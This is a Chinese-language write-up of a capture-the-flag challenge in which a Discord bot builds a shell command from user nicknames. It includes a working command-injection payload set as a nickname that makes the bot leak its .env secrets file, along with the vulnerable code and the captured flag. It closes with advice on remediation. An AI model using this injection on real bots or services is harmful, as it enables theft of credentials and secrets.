# The Cardmaster

## 题目简述

题目目标是一个 Discord 机器人。用户加入服务器后可以用 `!card` 生成个人卡牌，`!devlog` 还会返回开发日志。需要利用卡牌生成流程中的 shell 命令注入，让机器人把保存 flag 的 `.env` 文件作为附件发送出来。

## 解题过程

`!devlog` 泄露了卡牌生成脚本以及机器人调用它的方式。关键逻辑是：

```python
path = os.popen(
    f"/app/create_card.sh "
    f"'{card_class}' "
    f"'{display_name}' "
    f"'{discord_tag}' "
    f"'{abilities}' "
    f"'{profile_picture}' "
    f"'{id}' "
    f"'{card_rarity_name}'"
).read().strip()

await ctx.send(
    file=discord.File(path, filename="card.jpg")
)
```

`create_card.sh` 正常会在最后输出生成的 JPEG 路径：

```bash
echo /tmp/$uuid.jpg
```

机器人把整个 shell 命令的标准输出当作本地文件路径，再用 `discord.File` 打开并发送。`display_name` 来自成员昵称，程序只把 `/` 替换成 `\/`，没有处理单引号、分号、重定向符或注释符。因此可以让昵称提前结束单引号参数，并改写命令输出。

将服务器昵称修改为：

```text
'>/dev/null; echo '.env' #
```

插入后，命令的关键部分变成：

```bash
/app/create_card.sh 'pwntopia' '' >/dev/null; echo '.env' # ...
```

其效果依次是：

1. 关闭昵称参数的单引号；
2. 执行原卡牌脚本，但把它的正常输出重定向到 `/dev/null`；
3. 单独执行 `echo '.env'`，让 `os.popen(...).read().strip()` 只得到 `.env`；
4. 用 `#` 注释掉后续参数，避免剩余引号破坏语法。

此时执行 `!card`，机器人会把当前工作目录下的 `.env` 打开，并伪装成名为 `card.jpg` 的附件发送。文件内容中的 flag 为：

```text
N0PS{w0ulD_U_7r4D3_y0ur_c4rDz_w1tH_m3?}
```

## 方法总结

漏洞由两个信任边界错误叠加而成：不可信昵称被拼进 shell 字符串，命令输出又被当作任意本地路径读取。防护不能靠替换少量字符；应使用 `subprocess.run([...], shell=False)` 以参数数组调用脚本，并让脚本通过受控返回值或固定输出目录交付文件。虽然入口是 Discord 机器人，但决定性能力是 shell 命令注入和执行边界突破，因此归入 `pwn`。
